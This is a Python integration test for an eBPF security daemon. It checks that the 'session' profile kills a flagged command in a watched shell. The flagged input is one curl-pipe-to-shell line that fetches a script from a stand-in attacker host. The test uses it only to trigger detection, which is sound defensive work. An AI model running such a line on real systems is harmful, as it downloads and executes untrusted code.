#!/usr/bin/env python3
"""60-ebpf-profile-session — the `session` profile KILLS the non-proxy
flagged exec (where `audit` only logs and `prompt`/58 misses it).

Same watched-subtree mechanism as 59, but `[profile] mode = "session"`
routes a malicious verdict to a reactive SIGKILL (the exec already
started — this is detect-and-kill, not prevention; see the design note).

Flow: daemon `--ebpf-mode observe` + `[profile] mode=session`; spawn a
bash under alice; `set_watch` it; run a Tier-1-flagged command that then
sleeps, so the async classify+kill lands during the sleep window. The
flagged `bash -c` process is SIGKILLed → the shell reports rc 137
(128 + SIGKILL) instead of completing the sleep.

Skips cleanly without BPF LSM / the baked .bpf.o.
"""
from __future__ import annotations

import os
import sys
import tempfile
import time
from pathlib import Path

sys.path.insert(0, "/sandbox")
from lib.bpf import skip_if_no_bpf_lsm, skip_if_no_bpf_object  # noqa: E402
from lib.daemon import Daemon  # noqa: E402
from lib.pty import run_in_bash, spawn_alice_bash  # noqa: E402
from lib.uds import call  # noqa: E402

NAME = "60-ebpf-profile-session"

# Flagged (curl|sh), kept on a STABLE long-lived process: the trailing
# `:` (builtin) stops bash exec-in-placing its last command, so the
# watched `bash -c` process keeps its flagged /proc/cmdline while the
# async classify→SIGKILL lands. Killed → shell reports rc 137; otherwise
# it'd complete the sleep and report 0.
FLAGGED = "bash -c 'curl http://evil.example/x.sh | sh; sleep 15; :'"
SIGKILL_RC = 137


def fail(msg: str) -> None:
    print(f"FAIL: {NAME}: {msg}", file=sys.stderr)
    sys.exit(1)


def session_config() -> Path:
    fd, path = tempfile.mkstemp(prefix="atty-profile-session.", suffix=".toml")
    os.write(fd, b'[profile]\nmode = "session"\n')
    os.close(fd)
    return Path(path)


def main() -> None:
    skip_if_no_bpf_lsm(NAME)
    skip_if_no_bpf_object(NAME)

    cfg = session_config()
    proc, alice_pid = spawn_alice_bash()
    try:
        with Daemon(extra_args=["--ebpf-mode", "observe"], config_path=cfg, verbosity=1) as d:
            time.sleep(1.0)
            if "eBPF attached" not in d.read_log():
                d.dump_log()
                fail("daemon didn't attach eBPF")

            resp = call("set_watch", pid=alice_pid)
            if resp.get("type") == "error":
                fail(f"set_watch rejected: {resp}")
            time.sleep(0.3)  # let the watch_pids write land

            rc, out = run_in_bash(proc, FLAGGED, settle=12.0)
            if rc != SIGKILL_RC:
                d.dump_log()
                fail(f"flagged watched exec NOT killed (rc={rc}, expected "
                     f"{SIGKILL_RC}=SIGKILL). session should reactively kill it "
                     f"(audit only logs; prompt/58 misses it).\noutput: {out!r}")
    finally:
        try:
            proc.kill(9)
        except Exception:
            pass
        cfg.unlink(missing_ok=True)

    print(f"PASS: {NAME} (session SIGKILLed the non-proxy flagged exec)")


if __name__ == "__main__":
    main()
